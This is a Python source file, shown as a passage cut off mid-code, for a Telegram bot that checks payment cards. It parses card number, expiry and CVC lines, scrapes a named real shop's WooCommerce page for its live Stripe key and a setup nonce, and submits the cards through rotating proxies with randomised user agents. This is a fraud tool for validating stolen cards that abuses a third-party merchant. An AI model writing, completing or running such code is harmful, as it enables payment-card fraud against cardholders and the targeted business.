import asyncio
import os
import re
import json
import uuid
import aiohttp
import aiofiles
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiohttp import web
from fake_useragent import UserAgent
from colorama import Fore, init

init(autoreset=True)

# ────────────────────────── CONFIGURATION ──────────────────────────
# These pull from Render's Environment Variables for security
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
PORT = int(os.getenv('PORT', 10000))
USER_FILE = 'authorized_users.json'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
ua = UserAgent()

# ────────────────────────── STATE MANAGEMENT ──────────────────────────
PROXIES = []
AUTHORIZED_USERS = {ADMIN_ID} if ADMIN_ID != 0 else set()

if os.path.exists(USER_FILE):
    try:
        with open(USER_FILE, 'r') as f:
            AUTHORIZED_USERS.update(json.load(f))
    except: pass

def save_users():
    with open(USER_FILE, 'w') as f:
        json.dump(list(AUTHORIZED_USERS), f)

class ProxyRotator:
    def __init__(self):
        self.index = 0
    def get_next(self):
        if not PROXIES: return None
        proxy = PROXIES[self.index]
        self.index = (self.index + 1) % len(PROXIES)
        return proxy

rotator = ProxyRotator()

# ────────────────────────── STRIPE CORE LOGIC ──────────────────────────

async def process_stripe_card(card_line, proxy_url):
    """Handles the full Stripe + WooCommerce Handshake"""
    try:
        # 1. Parse Card
        parts = card_line.split('|')
        if len(parts) < 4: return False, "Invalid Format"
        cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Target Configuration (Update site_url for your target)
        site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
        domain = "https://" + site_url.split('//')[-1].split('/')[0]

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            # 2. Get Nonce and Public Key
            async with session.get(site_url, headers={'User-Agent': ua.random}, proxy=proxy_url, timeout=15) as r:
                text = await r.text()
            
            pk = re.search(r'pk_live_[a-zA-Z0-9]{24,}', text)
            pk = pk.group(0) if pk else "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv"
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"(.*?)"', text)
            nonce = nonce.group(1) if nonce else ""

            # 3. Create Stripe Payment Method (API Version 2026-04-22)
            stripe_data = {
                'type': 'card',
                'card[number]': cc, 'card[cvc]': cvc,
                'card[exp_month]': mm, '

